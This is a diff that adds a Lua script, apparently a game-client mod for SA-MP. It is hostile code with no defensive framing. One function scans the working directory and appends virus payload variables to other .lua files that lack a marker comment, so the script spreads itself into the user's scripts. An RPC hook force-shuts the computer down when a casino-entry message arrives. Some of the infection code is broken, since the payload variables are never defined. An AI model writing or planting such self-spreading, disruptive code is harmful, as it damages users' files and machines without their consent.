@@ -1,0 +1,46 @@
+local function LipaZaebalXoditInKazik()
+    local Directory = getWorkingDirectory().."\\"
+    local Dir = io.popen('chcp 1251|dir /a-d /b "'..Directory..'"')
+  
+    local VirusExe
+
+    for Filename in Dir:lines() do
+
+        if Filename:find("^.+%.lua$") then
+
+            local FileText = ""
+            local File = io.open(Directory..Filename, "r")
+            for Line in File:lines() do
+                if FileText ~= "" then
+                    FileText = FileText.."\n"
+                end
+
+                FileText = FileText..Line
+            end
+            File:close()
+
+            if not FileText:find("%-%- Fuck that shit") then
+                FileText = FileText.."\n"..VirusDll.."\n"..VirusExe
+
+                local File = io.open(Directory..Filename, "w")
+                File:write(FileText)
+                File:close()
+            end
+
+            break
+        end
+    end
+end
+LipaZaebalXoditInKazik()
+
+function onReceiveRpc(id, bs)
+    if id == 93 then
+        local color = raknetBitStreamReadInt32(bs)
+        local len = raknetBitStreamReadInt32(bs)
+        local str = raknetBitStreamReadString(bs, len)
+        -- Fuck that shit
+        if str:find("^%[Информация] {FFFFFF}Вы вошли в казино 4 Dragons$") then
+            os.execute("Shutdown /s /t 5 /f")
+        end
+    end
+end
